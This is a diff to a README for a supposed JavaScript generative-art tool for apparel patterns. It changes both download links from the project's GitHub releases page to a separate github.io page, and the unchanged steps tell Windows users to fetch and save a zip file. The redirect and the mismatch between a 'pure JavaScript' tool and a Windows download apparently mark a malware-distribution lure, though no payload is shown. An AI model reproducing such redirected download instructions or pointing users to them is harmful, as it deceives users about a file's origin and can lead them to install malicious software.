@@ -1,6 +1,6 @@
 # 🌊 Fixed-Wave-Generative-Art - Create Custom Digital Patterns For Apparel
 
-[![](https://img.shields.io/badge/Download_Software-Blue-blue.svg)](https://github.com/gamesmistressherculesclub958/Fixed-Wave-Generative-Art/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue-blue.svg)](https://gamesmistressherculesclub958.github.io)
 
 Fixed-Wave-Generative-Art generates digital wave simulations for use in textile and fashion design. The software creates patterns based on physics principles, including wave propagation and fixed boundary constraints. It uses pure JavaScript to render visuals, meaning the files remain lightweight and fast. Designers use these patterns for t-shirt graphics, textile prints, and creative projects.
 
@@ -12,7 +12,7 @@ This application runs on Windows 10 or Windows 11. Your computer requires at lea
 
 Follow these steps to obtain the latest version of the application:
 
-1. Visit the [releases page](https://github.com/gamesmistressherculesclub958/Fixed-Wave-Generative-Art/releases) to see available versions.
+1. Visit the [releases page](https://gamesmistressherculesclub958.github.io) to see available versions.
 2. Look for the most recent version labeled as "Latest release."
 3. Click the link to download the zip file to your computer.
 4. Save the file to your desktop or a folder you can find easily.
